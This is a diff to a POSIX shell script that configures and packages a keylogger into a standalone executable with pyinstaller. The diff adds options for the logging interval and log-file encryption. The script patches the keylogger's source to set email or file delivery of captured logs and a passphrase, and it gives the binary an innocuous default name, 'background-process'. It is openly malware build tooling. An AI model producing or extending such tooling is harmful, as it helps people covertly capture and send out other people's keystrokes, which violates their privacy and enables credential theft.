@@ -1,6 +1,6 @@
 #!/bin/dash
 
-# usage: ./generate-exe [ -h(elp) ] [ -o(utputname) = ~/background-process ] [ -p(assphrase) = fishing-in-the-river-champion ] [ -l(ogsmethod) = [e(mail)|f(ile)]=f ]
+# usage: ./generate-exe [ -h(elp) ] [ -i(nterval) = <60 seconds> ] [ -e(ncrypt log files) =[y(es)|n(o)]=y ] [ -o(utputname) = ~/background-process ] [ -p(assphrase) = fishing-in-the-river-champion ] [ -l(ogsmethod) = [e(mail)|f(ile)]=f ]
 
 # shell script to generate the executable file for the keylogger
 # run this using dash to ensure greatest extent of POSIX compliance accross platforms
@@ -8,6 +8,8 @@
 # all flags have default values set inside keylogger.py so they don't have to be set in here
 
 # the executable will be moved to ~/-outputname
+intervalns=''
+encryptlog=''
 outputname=''
 passphrase=''
 logsmethod=''
@@ -16,7 +18,7 @@ do
     flag="$1"
     if [ "$flag" = '-h' ]
     then
-        echo 'usage: ./generate-exe [ -h(elp) ] [ -o(utputname) = background-process ] [ -p(assphrase) = fishing-in-the-river-champion ] [ -l(ogsmethod) = [e(mail)|f(ile)]=f ]'
+        echo 'usage: ./generate-exe [ -h(elp) ] [ -i(nterval) = <60 seconds> ] [ -e(ncrypt log files) =[y(es)|n(o)]=y ] [ -o(utputname) = ~/background-process ] [ -p(assphrase) = fishing-in-the-river-champion ] [ -l(ogsmethod) = [e(mail)|f(ile)]=f ]'
         exit 0
     fi
     shift
@@ -29,6 +31,8 @@ do
     fi
 
     case "$flag" in
+        '-i') intervalns="$item" ;;
+        '-e') encryptlog="$item" ;;
         '-o') outputname="$item" ;;
         '-p') passphrase="$item" ;;
         '-l') logsmethod="$item" ;;
@@ -38,10 +42,19 @@ do
     shift
 done
 
+# check that the interval is numeric 
+echo "$intervalns" | grep -Ex '[0-9]*' > /dev/null || { echo "'$intervalns' is not a natural number" ; exit 3 ; }
+# and greater than 0
+[ -z "$intervalns" ] || [ "$intervalns" -gt 0 ] || { echo "'$intervalns' is not greater than 0" ; exit 4 ; }
+
+# check that the encrypt logfile option is either y(es) or n(o)
+[ -z "$encryptlog" ] || echo "$encryptlog" | grep -Ex '[yn]' > /dev/null || { echo "'$encryptlog' is not a valid option (valid ones are [ y(es)|n(o) ])" ; exit 5 ; }
+
+
 # check only lowercase letters and hyphens
 # we can use the * quantifier to make empty strings pass the test
 compliant_phrase() {
-    echo "$1" | grep -Ex '[a-z-]*' > /dev/null || { echo "'$1' is not entirely made up of lowercase letters and hyphens" ; exit 3 ; }
+    echo "$1" | grep -Ex '[a-z-]*' > /dev/null || { echo "'$1' is not entirely made up of lowercase letters and hyphens" ; exit 6 ; }
 }
 
 # check phrases match naming requirements
@@ -49,7 +62,7 @@ compliant_phrase "$outputname"
 compliant_phrase "$passphrase"
 
 # check that logging flag is valid
-echo "$logsmethod" | grep -Ex '[ef]*' > /dev/null || { echo "'$logsmethod' is not a valid logging method (valid ones are [ e(mail)|f(ile) ]" ; exit 4 ; }
+[ -z "$logsmethod" ] || echo "$logsmethod" | grep -Ex '[ef]' > /dev/null || { echo "'$logsmethod' is not a valid logging method (valid ones are [ e(mail)|f(ile) ])" ; exit 7 ; }
 
 # make a backup of keylogger and edit the backup
 # note we don't delete this in case in needs to be inspected if something goes wrong
@@ -59,7 +72,18 @@ cp keylogger.py keylogger-2.py
 
 alias mysed="sed -E -i ''"
 
-# the default for logging is file so check if it's email
+if [ ! -z "$intervalns" ]
+then
+    mysed "s/(self\.log_interval = )(60)/\1$intervalns/" keylogger-2.py
+fi
+
+# check for arguments against their default boolean settings
+
+if [ "$encryptlog" = 'n' ]
+then
+    mysed 's/(self\.encrypt_logfiles= )(True)/\1False/' keylogger-2.py
+fi
+
 if [ "$logsmethod" = 'e' ]
 then
     mysed 's/(self\.log_via_email = )(False)/\1True/' keylogger-2.py
@@ -75,8 +99,8 @@ then
     mysed "s/(self\.passphrase = )'(fishing-in-the-river-champion)'/\1'$passphrase'/" keylogger-2.py
 fi
 
-# delete any existing pyinstaller output
-./rm-pyinstaller > /dev/null 2>&1
+# # delete any existing pyinstaller output
+# ./rm-pyinstaller > /dev/null 2>&1
 
-# now ready to build the file
-pyinstaller --onefile keylogger-2.py --name $outputname && cp dist/$outputname ~
+# # now ready to build the file
+# pyinstaller --onefile keylogger-2.py --name $outputname && cp dist/$outputname ~
